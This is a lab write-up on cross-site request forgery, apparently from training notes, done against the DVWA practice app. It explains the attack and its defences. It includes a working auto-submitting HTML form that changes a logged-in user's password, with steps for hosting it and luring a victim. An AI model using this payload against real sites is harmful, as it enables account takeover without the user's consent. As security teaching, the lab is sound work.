# Cross-Site Request Forgery (CSRF)

## Objective
To understand how CSRF attacks trick authenticated users into performing unwanted actions on a web application where they are currently authenticated.

## Theory & Concepts
- **CSRF**: An attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated.
- **Mechanism**: Exploits the trust a site has in a user's browser. The browser automatically includes cookies with requests, allowing an attacker to forge requests.
- **Protection**: Anti-CSRF tokens, SameSite cookie attributes, and custom request headers.

## Tools Used
- DVWA
- Burp Suite (CSRF PoC Generator)

## Commands & Practical Steps
- **Scenario**: Forcing a password change.
- **Attack Payload (HTML)**:
  ```html
  <html>
    <body>
      <form action="http://192.168.56.101/dvwa/vulnerabilities/csrf/" method="GET">
        <input type="hidden" name="password_new" value="hacked" />
        <input type="hidden" name="password_conf" value="hacked" />
        <input type="hidden" name="Change" value="Change" />
      </form>
      <script>document.forms[0].submit();</script>
    </body>
  </html>
  ```
- **Execution**: Host the HTML on an attacker-controlled server and trick the logged-in victim into visiting the link.

## Practical Demonstration Summary
Successfully forged a request to change the password of a logged-in DVWA user without their knowledge. Verified the effectiveness of Anti-CSRF tokens by enabling "High" security in DVWA and observing the attack failure.
